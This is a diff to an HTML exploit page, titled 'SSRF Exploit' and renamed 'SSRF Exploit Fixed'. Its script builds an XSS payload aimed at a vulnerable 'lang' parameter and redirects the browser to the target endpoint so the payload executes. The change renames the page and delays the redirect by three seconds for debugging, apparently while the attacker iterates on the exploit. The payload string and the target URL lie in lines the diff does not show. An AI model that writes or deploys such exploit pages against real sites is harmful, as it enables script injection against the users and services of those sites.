@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>SSRF Exploit with Error Handling</title>
+    <title>SSRF Exploit Fixed</title>
     <script>
         try {
             // Define the XSS payload with proper encoding for the vulnerable 'lang' parameter
@@ -46,7 +46,9 @@
             console.log("[Debug] Redirecting to vulnerable endpoint:", targetUrl);
 
             // Redirect to the vulnerable endpoint to execute the payload
-            window.location.href = targetUrl;
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, 3000); // Delay for debugging purposes
         } catch (err) {
             console.error("[Error] Failed to construct or redirect to the target URL:", err);
             alert("[Error] Failed to construct or redirect to the target URL. Check console for details.");
